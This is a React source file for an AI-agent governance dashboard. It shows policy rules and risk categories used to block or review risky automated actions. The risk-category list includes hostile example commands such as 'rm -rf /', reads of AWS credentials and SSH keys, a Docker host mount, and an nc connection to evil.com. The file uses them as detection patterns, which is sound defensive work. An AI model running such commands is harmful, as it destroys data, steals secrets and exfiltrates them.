import { useState, useEffect } from "react";
import type { RiskCategory, RiskLevel, PolicyRecord } from "../types/guardian";
import { RiskBadge } from "../components/DecisionBadge";
import { getActivePolicy } from "../api/client";
import { Shield, Sliders } from "lucide-react";

interface GovernanceProps {
  view: "policies" | "risks";
}

interface PolicyRuleDef {
  id: string;
  name: string;
  enforcement: "block" | "review" | "allow";
  description: string;
  threshold: number;
  triggerCategory: string;
  status: "active" | "monitoring";
  version: string;
}

const DEFAULT_POLICY_RULES: PolicyRuleDef[] = [
  {
    id: "pol-001",
    name: "Destructive Action in Production Override",
    enforcement: "block",
    description:
      "Hard interception of any schema drop, data deletion, or storage truncation targeted at live production environments.",
    threshold: 0.75,
    triggerCategory: "destructive + production",
    status: "active",
    version: "1.4",
  },
  {
    id: "pol-002",
    name: "Credential Access & Secret Interception",
    enforcement: "block",
    description:
      "Intercepts commands accessing AWS credentials, SSH private keys, API secrets, token stores, or password files.",
    threshold: 0.75,
    triggerCategory: "credential_access",
    status: "active",
    version: "1.4",
  },
  {
    id: "pol-003",
    name: "Privilege Escalation & Container Breakout",
    enforcement: "block",
    description:
      "Denies container root mounts, sudo operations, Docker socket binding, and unverified kernel permission grants.",
    threshold: 0.75,
    triggerCategory: "privilege_escalation",
    status: "active",
    version: "1.4",
  },
  {
    id: "pol-004",
    name: "Unverified Data Exfiltration",
    enforcement: "review",
    description:
      "Requires human analyst sign-off before automated agents can stream or dump large datasets across network boundaries.",
    threshold: 0.50,
    triggerCategory: "data_exfiltration",
    status: "active",
    version: "1.4",
  },
  {
    id: "pol-005",
    name: "Customer PII Mass Export",
    enforcement: "review",
    description:
      "Flags operations matching customer personal identification, sensitive identifiers, or financial ledger tables.",
    threshold: 0.50,
    triggerCategory: "customer_data",
    status: "active",
    version: "1.4",
  },
  {
    id: "pol-006",
    name: "Temporary Artifact Maintenance Baseline",
    enforcement: "allow",
    description:
      "Permits non-destructive file operations scoped exclusively to volatile directories (/tmp, build-cache).",
    threshold: 0.20,
    triggerCategory: "temporary_files",
    status: "active",
    version: "1.4",
  },
];

interface CategorySpec {
  name: RiskCategory;
  severity: RiskLevel;
  description: string;
  examples: string[];
  detectorSource: "semantic_model" | "heuristic_rule" | "hybrid";
}

const CATEGORY_SPECS: CategorySpec[] = [
  {
    name: "destructive",
    severity: "critical",
    description: "Irreversible data erasure, table drops, recursive file removal, partition format.",
    examples: ["drop table", "rm -rf /", "truncate table", "delete from users"],
    detectorSource: "hybrid",
  },
  {
    name: "privilege_escalation",
    severity: "critical",
    description: "Attempts to gain administrative, root, sudo, or host execution rights.",
    examples: ["sudo su", "chmod 777 /etc/passwd", "docker -v /:/host", "chown root"],
    detectorSource: "hybrid",
  },
  {
    name: "credential_access",
    severity: "critical",
    description: "Extracting, copying, or reading cryptographic tokens, API keys, or credentials.",
    examples: ["cat ~/.aws/credentials", "echo $DATABASE_URL", "read /root/.ssh/id_rsa"],
    detectorSource: "hybrid",
  },
  {
    name: "data_exfiltration",
    severity: "high",
    description: "Transmitting internal datasets, schemas, or memory dumps to external endpoints.",
    examples: ["curl -X POST https://...", "scp dump.sql external:", "nc -w 3 evil.com 4444"],
    detectorSource: "hybrid",
  },
  {
    name: "production",
    severity: "high",
    description: "Targeting live infrastructure, production clusters, primary database clusters.",
    examples: ["env=production", "db=prod_master", "cluster=k8s-prod-us-east-1"],
    detectorSource: "semantic_model",
  },
  {
    name: "customer_data",
    severity: "high",
    description: "Personally identifiable customer information, emails, physical addresses.",
    examples: ["select ssn, name from customers", "export users_csv"],
    detectorSource: "semantic_model",
  },
  {
    name: "financial_data",
    severity: "high",
    description: "Credit card records, payment processor tokens, bank account information.",
    examples: ["select card_token from payments", "stripe_secret_key"],
    detectorSource: "semantic_model",
  },
  {
    name: "employee_data",
    severity: "medium",
    description: "Internal human resources data, employee compensation, performance reviews.",
    examples: ["payroll_salaries", "employee_hr_notes"],
    detectorSource: "semantic_model",
  },
  {
    name: "database",
    severity: "medium",
    description: "Direct SQL query execution, transaction handling, relational storage mutations.",
    examples: ["alter table", "create index concurrently", "vacuum full"],
    detectorSource: "heuristic_rule",
  },
  {
    name: "temporary_files",
    severity: "low",
    description: "Volatile files, build scratchpads, temporary cache dirs, ephemeral logs.",
    examples: ["/tmp/build.log", "/var/cache/app", "scratch/*.tmp"],
    detectorSource: "heuristic_rule",
  },
];

const ENVIRONMENTS = ["Production", "Staging", "Sandbox"];

export function Governance({ view }: GovernanceProps) {
  const [environment, setEnvironment] = useState<string>("Production");
  const [policy, setPolicy] = useState<PolicyRecord | null>(null);

  useEffect(() => {
    if (view !== "policies") return;
    let isCurrent = true;

    getActivePolicy(environment)
      .then((data) => {
        if (isCurrent && data) {
          setPolicy(data);
        }
      })
      .catch(() => {
        if (isCurrent) {
          setPolicy(null);
        }
      });

    return () => {
      isCurrent = false;
    };
  }, [view, environment]);

  return (
    <div className="overview-editorial-wrap">
      {view === "policies" ? (
        <>
          <div className="page-header-block flex flex-col sm:flex-row sm:items-start justify-between gap-4">
            <div>
              <h1 className="page-main-heading">Policy specification</h1>
              <p className="page-sub-heading">
                Deterministic rulesets, score cutoffs, and interception gates for automated systems.
              </p>
            </div>
            
            <div className="flex items-center gap-2">
              <div className="flex items-center bg-[#18181b] border border-[#27272a] rounded-lg p-0.5">
                {ENVIRONMENTS.map((env) => (
                  <button
                    key={env}
                    type="button"
                    className={`px-3 py-1 text-xs font-medium rounded-md transition-colors ${
                      environment === env
                        ? "bg-[#27272a] text-white"
                        : "text-[#a1a1aa] hover:text-white"
                    }`}
                    onClick={() => setEnvironment(env)}
                  >
                    {env}
                  </button>
                ))}
              </div>
              <div className="policy-version-pill">
                Ruleset: <strong>{policy?.version || "v1.4"}</strong>
              </div>
            </div>
          </div>

          {/* Threshold Gate Overview */}
          <div className="grid grid-cols-1 md:grid-cols-3 gap-3 mb-6">
            <div className="p-4 rounded-xl border border-[#27272a] bg-[#121214]">
              <div className="flex items-center justify-between text-xs text-[#a1a1aa]">
                <span className="flex items-center gap-1.5 font-medium">
                  <Shield size={14} className="text-rose-500" />
                  Block gate
                </span>
                <span className="font-mono text-rose-400">≥ {policy?.block_threshold ?? 0.75}</span>
              </div>
              <p className="text-xs text-[#71717a] mt-2">
                Actions meeting or exceeding this cutoff are immediately denied without exception.
              </p>
            </div>

            <div className="p-4 rounded-xl border border-[#27272a] bg-[#121214]">
              <div className="flex items-center justify-between text-xs text-[#a1a1aa]">
                <span className="flex items-center gap-1.5 font-medium">
                  <Sliders size={14} className="text-amber-500" />
                  Review gate
                </span>
                <span className="font-mono text-amber-400">
                  {policy?.review_threshold ?? 0.50} – {((policy?.block_threshold ?? 0.75) - 0.01).toFixed(2)}
                </span>
              </div>
              <p className="text-xs text-[#71717a] mt-2">
                Escalates action to human review queue for security lead sign-off.
              </p>
            </div>

            <div className="p-4 rounded-xl border border-[#27272a] bg-[#121214]">
              <div className="flex items-center justify-between text-xs text-[#a1a1aa]">
                <span className="flex items-center gap-1.5 font-medium">
                  <Shield size={14} className="text-emerald-500" />
                  Allow baseline
                </span>
                <span className="font-mono text-emerald-400">&lt; {policy?.review_threshold ?? 0.50}</span>
              </div>
              <p className="text-xs text-[#71717a] mt-2">
                Authorized autonomous execution within safe baseline parameters.
              </p>
            </div>
          </div>

          <div className="dev-table-container">
            <table className="dev-table">
              <thead>
                <tr>
                  <th style={{ width: "100px" }}>Rule ID</th>
                  <th>Policy Name & Scope</th>
                  <th style={{ width: "110px" }}>Enforcement</th>
                  <th style={{ width: "200px" }}>Trigger Category</th>
                  <th style={{ width: "90px" }}>Cutoff</th>
                  <th style={{ width: "90px", textAlign: "right" }}>Status</th>
                </tr>
              </thead>
              <tbody>
                {policy?.rules && policy.rules.length > 0 ? (
                  policy.rules.map((rule, idx) => (
                    <tr key={idx} className="dev-table-row">
                      <td>
                        <code className="mono-text">pol-00{idx + 1}</code>
                      </td>
                      <td>
                        <div className="policy-info-cell">
                          <span className="policy-name-text">{rule.reason}</span>
                          <p className="policy-desc-text">Rule enforced for {environment.toLowerCase()} environment.</p>
                        </div>
                      </td>
                      <td>
                        <span className={`decision-col-token ${rule.decision.toLowerCase()}`}>
                          {rule.decision.toLowerCase()}
                        </span>
                      </td>
                      <td>
                        <code className="tag-pill mono-text">{rule.category.toLowerCase()}</code>
                      </td>
                      <td>
                        <code className="mono-text text-[#71717a]">
                          {rule.decision.toLowerCase() === "block" ? "≥ 0.75" : "≥ 0.50"}
                        </code>
                      </td>
                      <td style={{ textAlign: "right" }}>
                        <span className="status-indicator-tag active">
                          <span>active</span>
                        </span>
                      </td>
                    </tr>
                  ))
                ) : (
                  DEFAULT_POLICY_RULES.map((rule) => (
                    <tr key={rule.id} className="dev-table-row">
                      <td>
                        <code className="mono-text">{rule.id}</code>
                      </td>
                      <td>
                        <div className="policy-info-cell">
                          <span className="policy-name-text">{rule.name}</span>
                          <p className="policy-desc-text">{rule.description}</p>
                        </div>
                      </td>
                      <td>
                        <span className={`decision-col-token ${rule.enforcement.toLowerCase()}`}>
                          {rule.enforcement.toLowerCase()}
                        </span>
                      </td>
                      <td>
                        <code className="tag-pill mono-text">{rule.triggerCategory}</code>
                      </td>
                      <td>
                        <code className="mono-text text-[#71717a]">≥ {rule.threshold.toFixed(2)}</code>
                      </td>
                      <td style={{ textAlign: "right" }}>
                        <span className="status-indicator-tag active">
                          <span>active</span>
                        </span>
                      </td>
                    </tr>
                  ))
                )}
              </tbody>
            </table>
          </div>
        </>
      ) : (
        <>
          <div className="page-header-block flex items-start justify-between">
            <div>
              <h1 className="page-main-heading">Risk categories</h1>
              <p className="page-sub-heading">
                Standard classification categories recognized by Guardian's semantic and heuristic engines.
              </p>
            </div>
            <div className="counter-pill">10 Standard Categories</div>
          </div>

          <div className="dev-table-container">
            <table className="dev-table">
              <thead>
                <tr>
                  <th style={{ width: "210px" }}>Category Identifier</th>
                  <th style={{ width: "110px" }}>Default Severity</th>
                  <th>Scope & Definition</th>
                  <th style={{ width: "150px" }}>Detection Source</th>
                  <th>Pattern Examples</th>
                </tr>
              </thead>
              <tbody>
                {CATEGORY_SPECS.map((cat) => (
                  <tr key={cat.name} className="dev-table-row">
                    <td>
                      <code className="mono-text font-medium text-[#09090b] dark:text-zinc-200">{cat.name}</code>
                    </td>
                    <td>
                      <RiskBadge level={cat.severity} size="sm" />
                    </td>
                    <td>
                      <span className="text-[#27272a] dark:text-zinc-300 leading-relaxed">{cat.description}</span>
                    </td>
                    <td>
                      <span className="tag-pill">{cat.detectorSource}</span>
                    </td>
                    <td>
                      <div className="example-tags-row">
                        {cat.examples.map((ex, idx) => (
                          <code key={idx} className="example-chip">{ex}</code>
                        ))}
                      </div>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </>
      )}
    </div>
  );
}
